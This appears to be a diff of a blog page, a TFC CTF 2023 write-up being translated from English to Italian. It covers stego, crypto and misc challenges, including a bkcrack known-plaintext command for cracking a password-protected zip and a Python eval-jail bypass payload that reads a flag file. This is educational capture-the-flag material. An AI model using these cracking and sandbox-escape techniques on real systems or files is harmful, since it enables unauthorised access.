 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-py" data-lang="py"><span class="line"><span class="cl"><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="mi">84</span><span class="p">,</span> <span class="mi">1</span><span class="p">)</span>
 </span></span><span class="line"><span class="cl"><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="mi">70</span><span class="p">,</span> <span class="mi">1</span><span class="p">)</span>
 </span></span><span class="line"><span class="cl"><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="mi">67</span><span class="p">,</span> <span class="mi">1</span><span class="p">)</span>
@@ -400,51 +401,50 @@ After I&rsquo;ve extracted all the images I tried to see what could be hidden in
 </span></span><span class="line"><span class="cl"><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="mi">84</span><span class="p">,</span> <span class="mi">1</span><span class="p">)</span>
 </span></span><span class="line"><span class="cl"><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="mi">70</span><span class="p">,</span> <span class="mi">1</span><span class="p">)</span>
 </span></span><span class="line"><span class="cl"><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="mi">123</span><span class="p">,</span> <span class="mi">1</span><span class="p">)</span>
-</span></span></code></pre></div><p>This was the result when I tried to extract the RGB values of each pixel of each colum: the Red value was always 1 and it was the same for the Blue value, but the Green one seemed to be an ASCII value. As a matter of fact they were just the format of the flag <code>TFCCTF{</code> hidden in the pixels.</p>
+</span></span></code></pre></div><p>Analizzando i valori RGB di ogni pixel, si notava che il valore di Red era sempre 1 (così come quello di Blue), mentre il valore di Green corrispondeva a un carattere ASCII. In sostanza, questi valori rappresentavano il formato della flag <code>TFCCTF{</code> nascosto nei pixel.</p>
 <h3 id="mcteenx">MCTeenX<a hidden class="anchor" aria-hidden="true" href="#mcteenx">#</a></h3>
-<p>This challenge was really interesting because it provided a zip file protected by a password that I couldn&rsquo;t bruteforce using a dictionary attack.
-It only had one file zipped in it that was a <code>.sh</code> file that normally has as first line like this</p>
+<p>Questa challenge era particolarmente interessante perché forniva un file zip protetto da password, che non era possibile crackare con un dizionario.<br>
+All&rsquo;interno c&rsquo;era un solo file, uno script <code>.sh</code> che normalmente iniziava con:</p>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl"><span class="cp">#!/bin/sh
-</span></span></span></code></pre></div><p>Since I knew part of the file text I could try a Plaintext Attack using <code>bkcrack</code> by executing this command</p>
+</span></span></span></code></pre></div><p>Conoscendo parte del contenuto, ho potuto tentare un Plaintext Attack con <code>bkcrack</code> eseguendo:</p>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">bkcrack -C src.zip -c script.sh -p temp_file.sh
-</span></span></code></pre></div><p>(the <code>temp_file.sh</code> file was just the known plaintext).<!-- raw HTML omitted --><!-- raw HTML omitted -->
-Luckily this tool could extract the <code>script.sh</code> file that seemed to be just an echo of an encoded base64 text piped in the file <code>red.png</code>.<!-- raw HTML omitted -->
-The first thing that popped up into my head was to analyze it using <code>zsteg</code> which found different things, but the most suspicious one was an hexadecimal text which, if decoded, appeared to be random bytes.<!-- raw HTML omitted -->
-<code>030a111418142c783b39380d397c0d25293324231c66220d367d3c23133c6713343e343b3931</code><!-- raw HTML omitted -->
-After a few tries I attempted to xor it with the flag format <code>TFCCTF{</code> which gave me back a string like this <code>WLRWLRW</code>.<!-- raw HTML omitted -->
-I then repetead this string until I filled the whole length of the hex string and I xored it again to see what I could get. Even if the first try went wrong because I mistyped the string, the following one decrypted the flag.</p>
+</span></span></code></pre></div><p>(dove <code>temp_file.sh</code> conteneva il plaintext noto).<br>
+Fortunatamente, lo strumento è riuscito a estrarre il file <code>script.sh</code>, che sembrava contenere semplicemente un&rsquo;istruzione echo di un testo codificato in base64, indirizzato al file <code>red.png</code>.<br>
+La prima idea è stata quella di analizzare il contenuto con <code>zsteg</code>, che ha evidenziato diverse anomalie. Tra queste, un testo esadecimale che, se decodificato, appariva come una sequenza di byte casuali:</p>
+<pre tabindex="0"><code>030a111418142c783b39380d397c0d25293324231c66220d367d3c23133c6713343e343b3931
+</code></pre><p>Dopo vari tentativi, ho provato ad applicare una XOR con il formato della flag <code>TFCCTF{</code>, ottenendo una stringa del tipo <code>WLRWLRW</code>.<br>
+Ripetendo la stringa fino a coprire tutta la lunghezza del testo esadecimale e applicando nuovamente la XOR, la flag è risultata chiara.</p>
 <h2 id="cryptography-">Cryptography 🔒<a hidden class="anchor" aria-hidden="true" href="#cryptography-">#</a></h2>
 <h3 id="dizzy">Dizzy<a hidden class="anchor" aria-hidden="true" href="#dizzy">#</a></h3>
-<p>Dizzy was the first challenge of the cyrpto section and it had this output</p>
+<p>Dizzy è stata la prima challenge della sezione crypto e produceva il seguente output:</p>
 <pre tabindex="0"><code>T4 l16 _36 510 _27 s26 _11 320 414 {6 }39 C2 T0 m28 317 y35 d31 F1 m22 g19 d38 z34 423 l15 329 c12 ;37 19 h13 _30 F5 t7 C3 325 z33 _21 h8 n18 132 k24
-</code></pre><p>after thinking what this could mean, I saw that a few pairs were somehow suspicious<!-- raw HTML omitted -->
-<code>T0 F1 C2 C3 T4 F5 {6</code><!-- raw HTML omitted -->
-Later I understood that all the pairs where just <code>char:position</code> randomly mixed, and after I&rsquo;ve written a quick script (just look the <code>normal_solution</code> function in the solve script) I found the whole flag.</p>
+</code></pre><p>Dopo aver riflettuto sul significato, ho notato che alcuni gruppi (come <code>T0 F1 C2 C3 T4 F5 {6</code>) erano particolarmente sospetti.<br>
+Alla fine ho capito che si trattava di coppie nel formato <code>carattere:posizione</code> mescolate in maniera casuale. Con uno script (vedi la funzione <code>normal_solution</code> nello script di soluzione) sono riuscito a ricostruire l&rsquo;intera flag.</p>
 <h3 id="mayday">Mayday<a hidden class="anchor" aria-hidden="true" href="#mayday">#</a></h3>
-<p>Like the previous one, this challenge had this output<!-- raw HTML omitted --></p>
+<p>Anche questa challenge produceva un output che, a prima vista, sembrava il NATO alphabet:</p>
 <pre tabindex="0"><code>Whiskey Hotel Four Tango Dash Alpha Romeo Three Dash Yankee Oscar Uniform Dash Sierra One November Kilo India November Golf Dash Four Bravo Zero Uniform Seven
-</code></pre><p>which was just the NATO alphabet and the solution was just to map every word to a character (or number) to find the flag.<!-- raw HTML omitted -->
-P.S. The flag was in the format <code>TFCCTF{FOUND_TEXT}</code></p>
+</code></pre><p>La soluzione consisteva semplicemente nel mappare ogni parola in un carattere (o numero) per ricostruire la flag.<br>
+P.S. La flag era nel formato <code>TFCCTF{FOUND_TEXT}</code></p>
 <h3 id="alien-music">Alien Music<a hidden class="anchor" aria-hidden="true" href="#alien-music">#</a></h3>
-<p>This challenge was just pure guessing, but the solution was the easiest one in the crypto section, it had this output<!-- raw HTML omitted --></p>
+<p>Questa challenge era basata sulla pura intuizione, ma era anche la più semplice della sezione crypto. L&rsquo;output era:</p>
 <pre tabindex="0"><code>DC# C#D# C#C C#C DC# C#D# E2 C#5 CA EC# CC DE CA EB EC# D#F EF# D6 D#4 CC EC EC CC# D#E CC E4
-</code></pre><p>After analyzing it for a while, I tried to connect the first pairs to the format <code>TFCCTF{</code> and I tought that the connection could be:<!-- raw HTML omitted --></p>
+</code></pre><p>Dopo un&rsquo;attenta analisi, ho tentato di collegare le prime coppie al formato <code>TFCCTF{</code> ipotizzando ad esempio:</p>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-py" data-lang="py"><span class="line"><span class="cl"><span class="nb">ord</span><span class="p">(</span><span class="s1">&#39;T&#39;</span><span class="p">)</span> <span class="o">=&gt;</span> <span class="mh">0x54</span> <span class="o">=&gt;</span> <span class="p">{</span><span class="s1">&#39;D&#39;</span> <span class="p">:</span> <span class="mi">5</span><span class="p">,</span> <span class="s1">&#39;C#&#39;</span> <span class="p">:</span> <span class="mi">4</span><span class="p">}</span>
 </span></span><span class="line"><span class="cl"><span class="nb">ord</span><span class="p">(</span><span class="s1">&#39;F&#39;</span><span class="p">)</span> <span class="o">=&gt;</span> <span class="mh">0x46</span> <span class="o">=&gt;</span> <span class="p">{</span><span class="s1">&#39;C#&#39;</span> <span class="p">:</span> <span class="mi">4</span><span class="p">,</span> <span class="s1">&#39;D#&#39;</span> <span class="p">:</span> <span class="mi">6</span><span class="p">}</span>
 </span></span><span class="line"><span class="cl"><span class="nb">ord</span><span class="p">(</span><span class="s1">&#39;C&#39;</span><span class="p">)</span> <span class="o">=&gt;</span> <span class="mh">0x43</span> <span class="o">=&gt;</span> <span class="p">{</span><span class="s1">&#39;C#&#39;</span> <span class="p">:</span> <span class="mi">4</span><span class="p">,</span> <span class="s1">&#39;C&#39;</span> <span class="p">:</span> <span class="mi">3</span><span class="p">}</span>
-</span></span></code></pre></div><p>I tried to map all the pairs in this python dictionary :</p>
+</span></span></code></pre></div><p>Ho quindi creato una mappatura con questo dizionario in Python:</p>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-py" data-lang="py"><span class="line"><span class="cl"><span class="n">d</span> <span class="o">=</span> <span class="p">{</span>
 </span></span><span class="line"><span class="cl">    <span class="s2">&#34;A&#34;</span><span class="p">:</span> <span class="s2">&#34;0&#34;</span><span class="p">,</span> <span class="s2">&#34;A#&#34;</span> <span class="p">:</span> <span class="s2">&#34;1&#34;</span><span class="p">,</span> <span class="s2">&#34;B&#34;</span> <span class="p">:</span> <span class="s2">&#34;2&#34;</span><span class="p">,</span> <span class="s2">&#34;C&#34;</span> <span class="p">:</span> <span class="s2">&#34;3&#34;</span><span class="p">,</span>  <span class="s2">&#34;C#&#34;</span> <span class="p">:</span> <span class="s2">&#34;4&#34;</span><span class="p">,</span> 
 </span></span><span class="line"><span class="cl">    <span class="s2">&#34;D&#34;</span><span class="p">:</span> <span class="s2">&#34;5&#34;</span><span class="p">,</span> <span class="s2">&#34;D#&#34;</span> <span class="p">:</span> <span class="s2">&#34;6&#34;</span><span class="p">,</span> <span class="s2">&#34;E&#34;</span> <span class="p">:</span> <span class="s2">&#34;7&#34;</span><span class="p">,</span> <span class="s2">&#34;F&#34;</span> <span class="p">:</span> <span class="s2">&#34;8&#34;</span><span class="p">,</span> <span class="s2">&#34;F#&#34;</span> <span class="p">:</span> <span class="s2">&#34;9&#34;</span><span class="p">,</span> 
 </span></span><span class="line"><span class="cl">    <span class="s2">&#34;1&#34;</span><span class="p">:</span> <span class="s2">&#34;a&#34;</span><span class="p">,</span> <span class="s2">&#34;2&#34;</span> <span class="p">:</span> <span class="s2">&#34;b&#34;</span><span class="p">,</span> <span class="s2">&#34;3&#34;</span> <span class="p">:</span> <span class="s2">&#34;c&#34;</span><span class="p">,</span> <span class="s2">&#34;4&#34;</span> <span class="p">:</span> <span class="s2">&#34;d&#34;</span><span class="p">,</span> <span class="s2">&#34;5&#34;</span> <span class="p">:</span> <span class="s2">&#34;e&#34;</span><span class="p">,</span> <span class="s2">&#34;6&#34;</span> <span class="p">:</span> <span class="s2">&#34;f&#34;</span>
 </span></span><span class="line"><span class="cl"><span class="p">}</span>
-</span></span></code></pre></div><p>and after that I wrote a quick script, I found the whole flag.</p>
+</span></span></code></pre></div><p>Dopo aver scritto uno script veloce, la flag è risultata.</p>
 <h3 id="rabid">Rabid<a hidden class="anchor" aria-hidden="true" href="#rabid">#</a></h3>
-<p>Rabid had a &rsquo;little&rsquo; hint in the text which said that they wrote a little &rsquo;extra&rsquo; information in the message, in fact the output &hellip;<!-- raw HTML omitted --></p>
+<p>Rabid forniva un piccolo indizio: nel messaggio era presente un extra. L&rsquo;output era:</p>
 <pre tabindex="0"><code>VEZDQ1RGe13kwdV9yNGIxZF9kMGc/IT8hPyE/IT8hPi8+Pz4/PjEyMzkwamNhcHNrZGowOTFyYW5kb21sZXR0ZXJzYW5kbnVtYmVyc3JlZWVlMmozfQ==
-</code></pre><p>was a base64 encoded message with an encoded prefix that was the format <code>TFCCTF{</code> and the only way to find the remaining flag was just to remove from the base64 message the encoded message <code>TFCCTF{</code> and decode it again.</p>
+</code></pre><p>Si trattava di un messaggio codificato in base64, che includeva un prefisso codificato nel formato <code>TFCCTF{</code>. L&rsquo;unico modo per ottenere il resto della flag era rimuovere il prefisso codificato e decodificare nuovamente il messaggio.</p>
 <h3 id="aes-ctf-tool-v1">AES CTF Tool V1<a hidden class="anchor" aria-hidden="true" href="#aes-ctf-tool-v1">#</a></h3>
-<p>To solve this challenge the easiest way was to install the <a href="https://github.com/hofill/AES-CTF-Tool">tool</a> that the admins wrote just for that challenge and execute the <code>main.py</code> file.<!-- raw HTML omitted --></p>
+<p>Per risolvere questa challenge, il modo più semplice è stato installare lo <a href="https://github.com/hofill/AES-CTF-Tool">strumento</a> sviluppato dagli admin appositamente per la challenge ed eseguire il file <code>main.py</code>:</p>
 <pre tabindex="0"><code>alan@ubuntu:~$ python3 main.py
 [INFO] Starting initial cryptanalysis.
 [INFO] Starting initial cryptanalysis.
@@ -483,7 +483,7 @@ Found: TFCCTF
 Found: TFCCTF{
 ...
 </code></pre><h3 id="aes-ctf-tool-v2">AES CTF Tool V2<a hidden class="anchor" aria-hidden="true" href="#aes-ctf-tool-v2">#</a></h3>
-<p>This challenge was exactly like the previous one but the tool also required to pass it an encrypted chipertext to decrypt.<!-- raw HTML omitted --></p>
+<p>Questa challenge era identica alla precedente, ma richiedeva in più di fornire un ciphertext crittografato da decriptare:</p>
 <pre tabindex="0"><code>alan@ubuntu:~$ python3 main.py
 [INFO] Starting initial cryptanalysis.
 [INFO] Starting initial cryptanalysis.
@@ -522,11 +522,11 @@ Intermediate value: 155
 ...
 </code></pre><h2 id="miscellaneous-">Miscellaneous ⚙️<a hidden class="anchor" aria-hidden="true" href="#miscellaneous-">#</a></h2>
 <h3 id="discord-shenanigans-v3">Discord Shenanigans V3<a hidden class="anchor" aria-hidden="true" href="#discord-shenanigans-v3">#</a></h3>
-<p>This challenge was just pure trolling because the flag was in the discord bot logo of the ctf server.</p>
+<p>Questa challenge era puramente un trolling, perché la flag era nascosta nel logo del bot Discord del server CTF.</p>
 <h3 id="my-first-calculator">My First Calculator<a hidden class="anchor" aria-hidden="true" href="#my-first-calculator">#</a></h3>
-<p>I actually didn&rsquo;t solved this challenge during the CTF because I didn&rsquo;t know the existence of this exploit that I&rsquo;m going to explain (credits dp_1).<!-- raw HTML omitted -->
-Python is just a &lsquo;misterious&rsquo; programming language that has some strange vulnerabilities where it comes to strings.
-This challenge provided a python file like this</p>
+<p>Non sono riuscito a risolvere questa challenge durante la CTF perché ignoravo l’esistenza di questo exploit (crediti a dp_1).<br>
+Python è infatti un linguaggio &ldquo;misterioso&rdquo; che presenta strane interpetazioni nella gestione delle stringhe.<br>
+La challenge forniva un file Python come il seguente:</p>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-py" data-lang="py"><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">sys</span>
 </span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="s2">&#34;This is a calculator&#34;</span><span class="p">)</span>
 </span></span><span class="line"><span class="cl"><span class="n">inp</span> <span class="o">=</span> <span class="nb">input</span><span class="p">(</span><span class="s2">&#34;Formula: &#34;</span><span class="p">)</span>
@@ -541,7 +541,7 @@ This challenge provided a python file like this</p>
 </span></span><span class="line"><span class="cl">    <span class="s2">&#34;pow&#34;</span><span class="p">:</span> <span class="nb">pow</span>
 </span></span><span class="line"><span class="cl"><span class="p">}</span>
 </span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="nb">eval</span><span class="p">(</span><span class="n">inp</span><span class="p">,</span> <span class="n">fns</span><span class="p">,</span> <span class="n">fns</span><span class="p">))</span>
-</span></span></code></pre></div><p>The exploit consisted in sending a payload written in italic that just could bypass the blacklist and than could read the flag doing something like this</p>
+</span></span></code></pre></div><p>L&rsquo;exploit consisteva nell&rsquo;inviare un payload &ldquo;invisibile&rdquo; (che bypassava la blacklist) per leggere la flag, ad esempio con:</p>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-py" data-lang="py"><span class="line"><span class="cl"><span class="s1">&#39;&#39;</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="n">i</span> <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">open</span><span class="p">(</span><span class="s2">&#34;flag&#34;</span><span class="p">,</span> <span class="s2">&#34;r&#34;</span><span class="p">))</span>
 </span></span></code></pre></div>
 
@@ -549,16 +549,16 @@ This challenge provided a python file like this</p>
 
   <footer class="post-footer">
     <ul class="post-tags">
-      <li><a href="https://albovo.tech/en/tags/tfcctf/">Tfcctf</a></li>
-      <li><a href="https://albovo.tech/en/tags/ctf/">Ctf</a></li>
-      <li><a href="https://albovo.tech/en/tags/binary/">Binary</a></li>
-      <li><a href="https://albovo.tech/en/tags/crypto/">Crypto</a></li>
-      <li><a href="https://albovo.tech/en/tags/web/">Web</a></li>
-      <li><a href="https://albovo.tech/en/tags/tfcctf2023/">Tfcctf2023</a></li>
+      <li><a href="https://albovo.tech/it/tags/tfcctf/">Tfcctf</a></li>
+      <li><a href="https://albovo.tech/it/tags/ctf/">Ctf</a></li>
+      <li><a href="https://albovo.tech/it/tags/binary/">Binary</a></li>
+      <li><a href="https://albovo.tech/it/tags/crypto/">Crypto</a></li>
+      <li><a href="https://albovo.tech/it/tags/web/">Web</a></li>
+      <li><a href="https://albovo.tech/it/tags/tfcctf2023/">Tfcctf2023</a></li>
     </ul>
 <nav class="paginav">
-  <a class="prev" href="https://albovo.tech/en/ctf/m0leconctf2023/">
-    <span class="title">« Prev</span>
+  <a class="prev" href="https://albovo.tech/it/ctf/m0leconctf2023/">
+    <span class="title">« Precedente</span>
     <br>
     <span>M0lecon CTF 2023 Beginner</span>
   </a>
@@ -568,7 +568,7 @@ This challenge provided a python file like this</p>
 <ul class="share-buttons">
     <li>
         <a target="_blank" rel="noopener noreferrer" aria-label="share TFC CTF 2023 on x"
-            href="https://x.com/intent/tweet/?text=TFC%20CTF%202023&amp;url=https%3a%2f%2falbovo.tech%2fen%2fctf%2ftfcctf2023%2f&amp;hashtags=tfcctf%2cctf%2cbinary%2ccrypto%2cweb%2ctfcctf2023">
+            href="https://x.com/intent/tweet/?text=TFC%20CTF%202023&amp;url=https%3a%2f%2falbovo.tech%2fit%2fctf%2ftfcctf2023%2f&amp;hashtags=tfcctf%2cctf%2cbinary%2ccrypto%2cweb%2ctfcctf2023">
             <svg version="1.1" viewBox="0 0 512 512" xml:space="preserve" height="30px" width="30px" fill="currentColor">
                 <path
                     d="M512 62.554 L 512 449.446 C 512 483.97 483.97 512 449.446 512 L 62.554 512 C 28.03 512 0 483.97 0 449.446 L 0 62.554 C 0 28.03 28.029 0 62.554 0 L 449.446 0 C 483.971 0 512 28.03 512 62.554 Z M 269.951 190.75 L 182.567 75.216 L 56 75.216 L 207.216 272.95 L 63.9 436.783 L 125.266 436.783 L 235.9 310.383 L 332.567 436.783 L 456 436.783 L 298.367 228.367 L 432.367 75.216 L 371.033 75.216 Z M 127.633 110 L 164.101 110 L 383.481 400.065 L 349.5 400.065 Z" />
@@ -577,7 +577,7 @@ This challenge provided a python file like this</p>
     </li>
     <li>
         <a target="_blank" rel="noopener noreferrer" aria-label="share TFC CTF 2023 on linkedin"
-            href="https://www.linkedin.com/shareArticle?mini=true&amp;url=https%3a%2f%2falbovo.tech%2fen%2fctf%2ftfcctf2023%2f&amp;title=TFC%20CTF%202023&amp;summary=TFC%20CTF%202023&amp;source=https%3a%2f%2falbovo.tech%2fen%2fctf%2ftfcctf2023%2f">
+            href="https://www.linkedin.com/shareArticle?mini=true&amp;url=https%3a%2f%2falbovo.tech%2fit%2fctf%2ftfcctf2023%2f&amp;title=TFC%20CTF%202023&amp;summary=TFC%20CTF%202023&amp;source=https%3a%2f%2falbovo.tech%2fit%2fctf%2ftfcctf2023%2f">
             <svg version="1.1" viewBox="0 0 512 512" xml:space="preserve" height="30px" width="30px" fill="currentColor">
                 <path
                     d="M449.446,0c34.525,0 62.554,28.03 62.554,62.554l0,386.892c0,34.524 -28.03,62.554 -62.554,62.554l-386.892,0c-34.524,0 -62.554,-28.03 -62.554,-62.554l0,-386.892c0,-34.524 28.029,-62.554 62.554,-62.554l386.892,0Zm-288.985,423.278l0,-225.717l-75.04,0l0,225.717l75.04,0Zm270.539,0l0,-129.439c0,-69.333 -37.018,-101.586 -86.381,-101.586c-39.804,0 -57.634,21.891 -67.617,37.266l0,-31.958l-75.021,0c0.995,21.181 0,225.717 0,225.717l75.02,0l0,-126.056c0,-6.748 0.486,-13.492 2.474,-18.315c5.414,-13.475 17.767,-27.434 38.494,-27.434c27.135,0 38.007,20.707 38.007,51.037l0,120.768l75.024,0Zm-307.552,-334.556c-25.674,0 -42.448,16.879 -42.448,39.002c0,21.658 16.264,39.002 41.455,39.002l0.484,0c26.165,0 42.452,-17.344 42.452,-39.002c-0.485,-22.092 -16.241,-38.954 -41.943,-39.002Z" />
@@ -586,7 +586,7 @@ This challenge provided a python file like this</p>
     </li>
     <li>
         <a target="_blank" rel="noopener noreferrer" aria-label="share TFC CTF 2023 on reddit"
-            href="https://reddit.com/submit?url=https%3a%2f%2falbovo.tech%2fen%2fctf%2ftfcctf2023%2f&title=TFC%20CTF%202023">
+            href="https://reddit.com/submit?url=https%3a%2f%2falbovo.tech%2fit%2fctf%2ftfcctf2023%2f&title=TFC%20CTF%202023">
             <svg version="1.1" viewBox="0 0 512 512" xml:space="preserve" height="30px" width="30px" fill="currentColor">
                 <path
                     d="M449.446,0c34.525,0 62.554,28.03 62.554,62.554l0,386.892c0,34.524 -28.03,62.554 -62.554,62.554l-386.892,0c-34.524,0 -62.554,-28.03 -62.554,-62.554l0,-386.892c0,-34.524 28.029,-62.554 62.554,-62.554l386.892,0Zm-3.446,265.638c0,-22.964 -18.616,-41.58 -41.58,-41.58c-11.211,0 -21.361,4.457 -28.841,11.666c-28.424,-20.508 -67.586,-33.757 -111.204,-35.278l18.941,-89.121l61.884,13.157c0.756,15.734 13.642,28.29 29.56,28.29c16.407,0 29.706,-13.299 29.706,-29.701c0,-16.403 -13.299,-29.702 -29.706,-29.702c-11.666,0 -21.657,6.792 -26.515,16.578l-69.105,-14.69c-1.922,-0.418 -3.939,-0.042 -5.585,1.036c-1.658,1.073 -2.811,2.761 -3.224,4.686l-21.152,99.438c-44.258,1.228 -84.046,14.494 -112.837,35.232c-7.468,-7.164 -17.589,-11.591 -28.757,-11.591c-22.965,0 -41.585,18.616 -41.585,41.58c0,16.896 10.095,31.41 24.568,37.918c-0.639,4.135 -0.99,8.328 -0.99,12.576c0,63.977 74.469,115.836 166.33,115.836c91.861,0 166.334,-51.859 166.334,-115.836c0,-4.218 -0.347,-8.387 -0.977,-12.493c14.564,-6.47 24.735,-21.034 24.735,-38.001Zm-119.474,108.193c-20.27,20.241 -59.115,21.816 -70.534,21.816c-11.428,0 -50.277,-1.575 -70.522,-21.82c-3.007,-3.008 -3.007,-7.882 0,-10.889c3.003,-2.999 7.882,-3.003 10.885,0c12.777,12.781 40.11,17.317 59.637,17.317c19.522,0 46.86,-4.536 59.657,-17.321c3.016,-2.999 7.886,-2.995 10.885,0.008c3.008,3.011 3.003,7.882 -0.008,10.889Zm-5.23,-48.781c-16.373,0 -29.701,-13.324 -29.701,-29.698c0,-16.381 13.328,-29.714 29.701,-29.714c16.378,0 29.706,13.333 29.706,29.714c0,16.374 -13.328,29.698 -29.706,29.698Zm-160.386,-29.702c0,-16.381 13.328,-29.71 29.714,-29.71c16.369,0 29.689,13.329 29.689,29.71c0,16.373 -13.32,29.693 -29.689,29.693c-16.386,0 -29.714,-13.32 -29.714,-29.693Z" />
@@ -595,7 +595,7 @@ This challenge provided a python file like this</p>
     </li>
     <li>
         <a target="_blank" rel="noopener noreferrer" aria-label="share TFC CTF 2023 on facebook"
-            href="https://facebook.com/sharer/sharer.php?u=https%3a%2f%2falbovo.tech%2fen%2fctf%2ftfcctf2023%2f">
+            href="https://facebook.com/sharer/sharer.php?u=https%3a%2f%2falbovo.tech%2fit%2fctf%2ftfcctf2023%2f">
             <svg version="1.1" viewBox="0 0 512 512" xml:space="preserve" height="30px" width="30px" fill="currentColor">
                 <path
                     d="M449.446,0c34.525,0 62.554,28.03 62.554,62.554l0,386.892c0,34.524 -28.03,62.554 -62.554,62.554l-106.468,0l0,-192.915l66.6,0l12.672,-82.621l-79.272,0l0,-53.617c0,-22.603 11.073,-44.636 46.58,-44.636l36.042,0l0,-70.34c0,0 -32.71,-5.582 -63.982,-5.582c-65.288,0 -107.96,39.569 -107.96,111.204l0,62.971l-72.573,0l0,82.621l72.573,0l0,192.915l-191.104,0c-34.524,0 -62.554,-28.03 -62.554,-62.554l0,-386.892c0,-34.524 28.029,-62.554 62.554,-62.554l386.892,0Z" />
@@ -604,7 +604,7 @@ This challenge provided a python file like this</p>
     </li>
     <li>
         <a target="_blank" rel="noopener noreferrer" aria-label="share TFC CTF 2023 on whatsapp"
-            href="https://api.whatsapp.com/send?text=TFC%20CTF%202023%20-%20https%3a%2f%2falbovo.tech%2fen%2fctf%2ftfcctf2023%2f">
+            href="https://api.whatsapp.com/send?text=TFC%20CTF%202023%20-%20https%3a%2f%2falbovo.tech%2fit%2fctf%2ftfcctf2023%2f">
             <svg version="1.1" viewBox="0 0 512 512" xml:space="preserve" height="30px" width="30px" fill="currentColor">
                 <path
                     d="M449.446,0c34.525,0 62.554,28.03 62.554,62.554l0,386.892c0,34.524 -28.03,62.554 -62.554,62.554l-386.892,0c-34.524,0 -62.554,-28.03 -62.554,-62.554l0,-386.892c0,-34.524 28.029,-62.554 62.554,-62.554l386.892,0Zm-58.673,127.703c-33.842,-33.881 -78.847,-52.548 -126.798,-52.568c-98.799,0 -179.21,80.405 -179.249,179.234c-0.013,31.593 8.241,62.428 23.927,89.612l-25.429,92.884l95.021,-24.925c26.181,14.28 55.659,21.807 85.658,21.816l0.074,0c98.789,0 179.206,-80.413 179.247,-179.243c0.018,-47.895 -18.61,-92.93 -52.451,-126.81Zm-126.797,275.782l-0.06,0c-26.734,-0.01 -52.954,-7.193 -75.828,-20.767l-5.441,-3.229l-56.386,14.792l15.05,-54.977l-3.542,-5.637c-14.913,-23.72 -22.791,-51.136 -22.779,-79.287c0.033,-82.142 66.867,-148.971 149.046,-148.971c39.793,0.014 77.199,15.531 105.329,43.692c28.128,28.16 43.609,65.592 43.594,105.4c-0.034,82.149 -66.866,148.983 -148.983,148.984Zm81.721,-111.581c-4.479,-2.242 -26.499,-13.075 -30.604,-14.571c-4.105,-1.495 -7.091,-2.241 -10.077,2.241c-2.986,4.483 -11.569,14.572 -14.182,17.562c-2.612,2.988 -5.225,3.364 -9.703,1.12c-4.479,-2.241 -18.91,-6.97 -36.017,-22.23c-13.314,-11.876 -22.304,-26.542 -24.916,-31.026c-2.612,-4.484 -0.279,-6.908 1.963,-9.14c2.016,-2.007 4.48,-5.232 6.719,-7.847c2.24,-2.615 2.986,-4.484 4.479,-7.472c1.493,-2.99 0.747,-5.604 -0.374,-7.846c-1.119,-2.241 -10.077,-24.288 -13.809,-33.256c-3.635,-8.733 -7.327,-7.55 -10.077,-7.688c-2.609,-0.13 -5.598,-0.158 -8.583,-0.158c-2.986,0 -7.839,1.121 -11.944,5.604c-4.105,4.484 -15.675,15.32 -15.675,37.364c0,22.046 16.048,43.342 18.287,46.332c2.24,2.99 31.582,48.227 76.511,67.627c10.685,4.615 19.028,7.371 25.533,9.434c10.728,3.41 20.492,2.929 28.209,1.775c8.605,-1.285 26.499,-10.833 30.231,-21.295c3.732,-10.464 3.732,-19.431 2.612,-21.298c-1.119,-1.869 -4.105,-2.99 -8.583,-5.232Z" />
@@ -613,7 +613,7 @@ This challenge provided a python file like this</p>
     </li>
     <li>
         <a target="_blank" rel="noopener noreferrer" aria-label="share TFC CTF 2023 on telegram"
-            href="https://telegram.me/share/url?text=TFC%20CTF%202023&amp;url=https%3a%2f%2falbovo.tech%2fen%2fctf%2ftfcctf2023%2f">
+            href="https://telegram.me/share/url?text=TFC%20CTF%202023&amp;url=https%3a%2f%2falbovo.tech%2fit%2fctf%2ftfcctf2023%2f">
             <svg version="1.1" xml:space="preserve" viewBox="2 2 28 28" height="30px" width="30px" fill="currentColor">
                 <path
                     d="M26.49,29.86H5.5a3.37,3.37,0,0,1-2.47-1,3.35,3.35,0,0,1-1-2.47V5.48A3.36,3.36,0,0,1,3,3,3.37,3.37,0,0,1,5.5,2h21A3.38,3.38,0,0,1,29,3a3.36,3.36,0,0,1,1,2.46V26.37a3.35,3.35,0,0,1-1,2.47A3.38,3.38,0,0,1,26.49,29.86Zm-5.38-6.71a.79.79,0,0,0,.85-.66L24.73,9.24a.55.55,0,0,0-.18-.46.62.62,0,0,0-.41-.17q-.08,0-16.53,6.11a.59.59,0,0,0-.41.59.57.57,0,0,0,.43.52l4,1.24,1.61,4.83a.62.62,0,0,0,.63.43.56.56,0,0,0,.4-.17L16.54,20l4.09,3A.9.9,0,0,0,21.11,23.15ZM13.8,20.71l-1.21-4q8.72-5.55,8.78-5.55c.15,0,.23,0,.23.16a.18.18,0,0,1,0,.06s-2.51,2.3-7.52,6.8Z" />
@@ -622,7 +622,7 @@ This challenge provided a python file like this</p>
     </li>
     <li>
         <a target="_blank" rel="noopener noreferrer" aria-label="share TFC CTF 2023 on ycombinator"
-            href="https://news.ycombinator.com/submitlink?t=TFC%20CTF%202023&u=https%3a%2f%2falbovo.tech%2fen%2fctf%2ftfcctf2023%2f">
+            href="https://news.ycombinator.com/submitlink?t=TFC%20CTF%202023&u=https%3a%2f%2falbovo.tech%2fit%2fctf%2ftfcctf2023%2f">
